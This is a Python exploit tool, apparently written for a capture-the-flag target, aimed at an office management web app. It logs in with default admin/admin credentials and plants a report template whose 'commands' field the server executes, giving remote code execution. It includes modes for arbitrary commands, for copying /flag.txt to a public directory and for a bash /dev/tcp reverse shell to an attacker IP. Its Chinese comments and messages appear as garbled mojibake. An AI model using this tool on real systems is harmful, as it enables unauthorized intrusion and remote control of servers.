#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import base64
import json
import sys
import time
import argparse
from urllib.parse import urljoin


class OfficeSystemExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def login(self, username="admin", password="admin"):
        """ç™»å½•ç³»ç»Ÿ"""
        print(f"[+] å°è¯•ç™»å½•ç”¨æˆ·: {username}")
        
        login_url = urljoin(self.target_url, '/login')
        data = {
            'username': username,
            'password': password
        }
        
        response = self.session.post(login_url, data=data, allow_redirects=False)
        
        if response.status_code == 302 and 'dashboard' in response.headers.get('Location', ''):
            print("[+] ç™»å½•æˆåŠŸ!")
            return True
        else:
            print("[-] ç™»å½•å¤±è´¥")
            return False
    
    def create_malicious_report(self, command):
        """åˆ›å»ºåŒ…å«æ¶æ„payloadçš„åˆ†ææŠ¥å‘Š"""
        print(f"[+] åˆ›å»ºæ¶æ„åˆ†ææŠ¥å‘Šï¼Œæ‰§è¡Œå‘½ä»¤: {command}")
        
        # æ„é€ æ¶æ„çš„JSONæ•°æ® - åˆ©ç”¨æ¨¡æ¿åŠŸèƒ½çš„RCEæ¼æ´
        # è¿™ä¸ªæ ¼å¼çœ‹èµ·æ¥åƒæ˜¯æ­£å¸¸çš„æŠ¥å‘Šæ¨¡æ¿å®šä¹‰
        fake_data = {
            "data": {
                "type": "system_analysis",
                "period": "monthly",
                "metrics": ["cpu", "memory", "disk"]
            },
            "template": {
                "template_type": "dynamic",
                "fields": ["performance", "usage"],
                # å…³é”®ï¼šcommandså­—æ®µä¼šè¢«æ‰§è¡Œ
                "commands": [command]
            }
        }
        
        create_url = urljoin(self.target_url, '/analytics/create')
        form_data = {
            'title': 'ç³»ç»Ÿæ€§èƒ½åˆ†ææŠ¥å‘Š',
            'description': 'è¯¦ç»†çš„ç³»ç»Ÿæ€§èƒ½åˆ†ææ•°æ®ï¼ŒåŒ…å«ç¼“å­˜ä¼˜åŒ–å»ºè®®',
            'data': json.dumps(fake_data)
        }
        
        response = self.session.post(create_url, data=form_data)
        
        if response.status_code == 200:
            result = response.json()
            if 'id' in result:
                report_id = result['id']
                print(f"[+] æŠ¥å‘Šåˆ›å»ºæˆåŠŸï¼ŒID: {report_id}")
                return report_id
        
        print("[-] æŠ¥å‘Šåˆ›å»ºå¤±è´¥")
        return None
    
    def trigger_vulnerability(self, report_id):
        """è§¦å‘æ¼æ´ - è®¿é—®æŠ¥å‘Šè¯¦æƒ…é¡µé¢"""
        print(f"[+] è§¦å‘æ¼æ´ - è®¿é—®æŠ¥å‘Š {report_id}")
        
        view_url = urljoin(self.target_url, f'/analytics/{report_id}')
        print(f"[+] è®¿é—®URL: {view_url}")
        
        response = self.session.get(view_url)
        
        if response.status_code == 200:
            print("[+] æ¼æ´è§¦å‘æˆåŠŸ! (é¡µé¢è®¿é—®æ­£å¸¸)")
            print("[+] ç­‰å¾…å‘½ä»¤æ‰§è¡Œ...")
            time.sleep(2)  # ç»™å‘½ä»¤æ‰§è¡Œæ—¶é—´
            return True
        else:
            print(f"[-] æ¼æ´è§¦å‘å¤±è´¥ (çŠ¶æ€ç : {response.status_code})")
            return False
    
    def check_command_execution(self, test_file="/tmp/rce_test"):
        """æ£€æŸ¥å‘½ä»¤æ˜¯å¦æ‰§è¡ŒæˆåŠŸ"""
        print("[+] æ£€æŸ¥å‘½ä»¤æ‰§è¡Œç»“æœ...")
        
        # ç­‰å¾…å‘½ä»¤æ‰§è¡Œ
        time.sleep(2)
        
        # å°è¯•åˆ›å»ºä¸€ä¸ªæµ‹è¯•æ–‡ä»¶åˆ°webç›®å½•æ¥éªŒè¯RCE
        test_command = "echo 'RCE_SUCCESS_$(date)' > /app/static/rce_test.txt"
        
        print("[+] åˆ›å»ºéªŒè¯æµ‹è¯•...")
        report_id = self.create_malicious_report(test_command)
        if report_id:
            # è§¦å‘ç¬¬äºŒæ¬¡æ¼æ´æ¥åˆ›å»ºæµ‹è¯•æ–‡ä»¶
            view_url = urljoin(self.target_url, f'/analytics/{report_id}')
            self.session.get(view_url)
            
            time.sleep(2)
            
            # æ£€æŸ¥æµ‹è¯•æ–‡ä»¶æ˜¯å¦å­˜åœ¨
            try:
                test_url = urljoin(self.target_url, '/static/rce_test.txt')
                response = self.session.get(test_url)
                
                if response.status_code == 200:
                    content = response.text.strip()
                    if 'RCE_SUCCESS' in content:
                        print(f"[+] å‘½ä»¤æ‰§è¡ŒéªŒè¯æˆåŠŸ: {content}")
                        return True
                    else:
                        print("[-] æµ‹è¯•æ–‡ä»¶å†…å®¹å¼‚å¸¸")
                else:
                    print("[-] æ— æ³•è®¿é—®æµ‹è¯•æ–‡ä»¶")
            except Exception as e:
                print(f"[-] éªŒè¯è¿‡ç¨‹å‡ºé”™: {e}")
        
        print("[!] å¦‚æœå‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œåº”è¯¥èƒ½çœ‹åˆ°ç›¸åº”çš„æ•ˆæœ")
        print("[!] ä¾‹å¦‚ï¼šæ–‡ä»¶åˆ›å»ºã€ç½‘ç»œè¿æ¥ã€è¿›ç¨‹å¯åŠ¨ç­‰")
        
        return True
    
    def exploit_rce(self, command):
        """å®Œæ•´çš„RCEæ¼æ´åˆ©ç”¨æµç¨‹"""
        print("="*60)
        print("æ™ºèƒ½åŠå…¬ç®¡ç†ç³»ç»Ÿ Redis ååºåˆ—åŒ– RCE æ¼æ´åˆ©ç”¨")
        print("="*60)
        
        # æ­¥éª¤1ï¼šç™»å½•ç³»ç»Ÿ
        if not self.login():
            return False
        
        # æ­¥éª¤2ï¼šåˆ›å»ºæ¶æ„æŠ¥å‘Š
        report_id = self.create_malicious_report(command)
        if not report_id:
            return False
        
        # æ­¥éª¤3ï¼šè§¦å‘æ¼æ´
        if not self.trigger_vulnerability(report_id):
            return False
        
        # æ­¥éª¤4ï¼šéªŒè¯å‘½ä»¤æ‰§è¡Œ
        self.check_command_execution()
        
        print("[+] æ¼æ´åˆ©ç”¨å®Œæˆ!")
        return True
    
    def get_flag(self):
        """è·å–flagçš„ç‰¹æ®Šåˆ©ç”¨"""
        print("[+] å°è¯•è·å–flag...")
        
        # å°†flagå†™å…¥åˆ°webå¯è®¿é—®ç›®å½•
        flag_command = "cat /flag.txt > /app/static/flag_result.txt"
        
        if self.exploit_rce(flag_command):
            print("[+] å·²æ‰§è¡Œè·å–flagå‘½ä»¤")
            print("[+] å°è¯•é€šè¿‡webè·¯å¾„è·å–ç»“æœ...")
            
            # ç­‰å¾…æ–‡ä»¶å†™å…¥
            time.sleep(3)
            
            # å°è¯•è®¿é—®ç»“æœæ–‡ä»¶
            try:
                flag_url = urljoin(self.target_url, '/static/flag_result.txt')
                response = self.session.get(flag_url)
                
                if response.status_code == 200:
                    flag_content = response.text.strip()
                    if flag_content:
                        print(f"\nğŸ‰ æˆåŠŸè·å– FLAG: {flag_content}")
                        return True
                    else:
                        print("[-] flagæ–‡ä»¶ä¸ºç©º")
                else:
                    print(f"[-] æ— æ³•è®¿é—®flagæ–‡ä»¶ (çŠ¶æ€ç : {response.status_code})")
            except Exception as e:
                print(f"[-] è·å–flagæ—¶å‡ºé”™: {e}")
            
            print("\n[!] å¦‚æœä¸Šè¿°æ–¹æ³•å¤±è´¥ï¼Œå¯ä»¥å°è¯•å…¶ä»–å¤–å¸¦æ–¹å¼ï¼š")
            print("    1. curl å‘½ä»¤å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨")
            print("    2. DNS æŸ¥è¯¢å¤–å¸¦")
            print("    3. åå‘shellè·å–")
            
            return True
        
        return False
    
    def reverse_shell(self, attacker_ip, attacker_port):
        """åå‘shellåˆ©ç”¨"""
        print(f"[+] å°è¯•å»ºç«‹åå‘shellåˆ° {attacker_ip}:{attacker_port}")
        
        # æ„é€ åå‘shellå‘½ä»¤
        shell_command = f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'"
        
        return self.exploit_rce(shell_command)


def print_banner():
    """æ‰“å°æ¨ªå¹…"""
    banner = """
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘              æ™ºèƒ½åŠå…¬ç®¡ç†ç³»ç»Ÿ RCE æ¼æ´åˆ©ç”¨å·¥å…·                â•‘
    â•‘                                                              â•‘
    â•‘  æ¼æ´ç±»å‹: Golang Gob ååºåˆ—åŒ– RCE                           â•‘
    â•‘  å½±å“ç»„ä»¶: Redis ç¼“å­˜ + æ•°æ®åˆ†ææ¨¡å—                          â•‘
    â•‘  å±é™©ç­‰çº§: é«˜å± (RCE)                                        â•‘
    â•‘                                                              â•‘
    â•‘  ä½¿ç”¨æ–¹æ³•:                                                   â•‘
    â•‘    python3 exploit.py -t http://target:8080 -c "command"    â•‘
    â•‘    python3 exploit.py -t http://target:8080 --flag          â•‘
    â•‘    python3 exploit.py -t http://target:8080 --shell ip port â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """
    print(banner)


def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description='æ™ºèƒ½åŠå…¬ç®¡ç†ç³»ç»Ÿ RCE æ¼æ´åˆ©ç”¨å·¥å…·')
    parser.add_argument('-t', '--target', required=True, help='ç›®æ ‡URL (ä¾‹å¦‚: http://192.168.1.100:8080)')
    parser.add_argument('-c', '--command', help='è¦æ‰§è¡Œçš„å‘½ä»¤')
    parser.add_argument('--flag', action='store_true', help='å°è¯•è·å–flag')
    parser.add_argument('--shell', nargs=2, metavar=('IP', 'PORT'), help='åå‘shell (IP PORT)')
    parser.add_argument('--check', action='store_true', help='æ£€æŸ¥ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´')
    
    args = parser.parse_args()
    
    if not any([args.command, args.flag, args.shell, args.check]):
        print("[-] è¯·æŒ‡å®šè¦æ‰§è¡Œçš„æ“ä½œï¼š-c å‘½ä»¤æ‰§è¡Œ, --flag è·å–flag, --shell åå‘shell, --check æ¼æ´æ£€æŸ¥")
        sys.exit(1)
    
    exploit = OfficeSystemExploit(args.target)
    
    try:
        if args.check:
            # æ¼æ´æ£€æŸ¥
            print("[+] æ£€æŸ¥ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´...")
            test_command = "echo 'VULN_CHECK_SUCCESS' > /app/static/vuln_check.txt"
            
            # å…ˆå°è¯•æ‰§è¡Œæµ‹è¯•å‘½ä»¤
            if exploit.login():
                report_id = exploit.create_malicious_report(test_command)
                if report_id:
                    exploit.trigger_vulnerability(report_id)
                    
                    # æ£€æŸ¥ç»“æœ
                    time.sleep(3)
                    try:
                        check_url = urljoin(args.target, '/static/vuln_check.txt')
                        response = exploit.session.get(check_url)
                        if response.status_code == 200 and 'VULN_CHECK_SUCCESS' in response.text:
                            print("[+] æ¼æ´æ£€æŸ¥æˆåŠŸï¼šç›®æ ‡å­˜åœ¨RCEæ¼æ´ï¼")
                            result = True
                        else:
                            print("[-] æ¼æ´æ£€æŸ¥å¤±è´¥ï¼šæœªæ£€æµ‹åˆ°å‘½ä»¤æ‰§è¡Œ")
                            result = False
                    except:
                        print("[-] æ¼æ´æ£€æŸ¥å¤±è´¥ï¼šç½‘ç»œé”™è¯¯")
                        result = False
                else:
                    result = False
            else:
                result = False
            
        elif args.command:
            # å‘½ä»¤æ‰§è¡Œ
            result = exploit.exploit_rce(args.command)
            
        elif args.flag:
            # è·å–flag
            result = exploit.get_flag()
            
        elif args.shell:
            # åå‘shell
            attacker_ip, attacker_port = args.shell
            result = exploit.reverse_shell(attacker_ip, attacker_port)
        
        if result:
            print("\n[+] æ¼æ´åˆ©ç”¨æˆåŠŸ!")
        else:
            print("\n[-] æ¼æ´åˆ©ç”¨å¤±è´¥")
            
    except KeyboardInterrupt:
        print("\n[!] ç”¨æˆ·ä¸­æ–­æ“ä½œ")
    except Exception as e:
        print(f"\n[-] å‘ç”Ÿé”™è¯¯: {e}")


if __name__ == "__main__":
    main() 